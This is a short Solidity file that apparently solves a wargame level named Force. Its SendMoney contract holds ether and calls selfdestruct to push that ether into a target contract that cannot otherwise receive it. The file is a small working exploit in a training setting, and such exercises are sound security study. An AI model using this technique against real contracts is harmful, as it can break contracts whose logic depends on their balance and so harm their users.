// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract SendMoney {

    Force public victim;

    constructor () payable {

    }

    function attack(address _contractAddr)public {
        selfdestruct(payable(_contractAddr));
    }


}